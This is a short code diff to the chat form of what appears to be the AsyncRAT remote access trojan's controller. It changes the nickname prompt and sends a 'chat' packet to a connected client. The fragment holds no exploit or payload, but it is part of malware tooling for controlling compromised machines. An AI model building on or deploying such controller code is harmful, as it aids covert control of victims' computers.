@@ -41,9 +41,14 @@ namespace AsyncRAT_Sharp.Forms
         {
             string nick = Interaction.InputBox("TYPE YOUR NICKNAME", "CHAT", "Admin");
             if (string.IsNullOrEmpty(nick))
-                return;
+                this.Close();
             else
+            {
                 Nickname = nick;
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "chat";
+                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
+            }
         }
 
         private void FormChat_FormClosed(object sender, FormClosedEventArgs e)
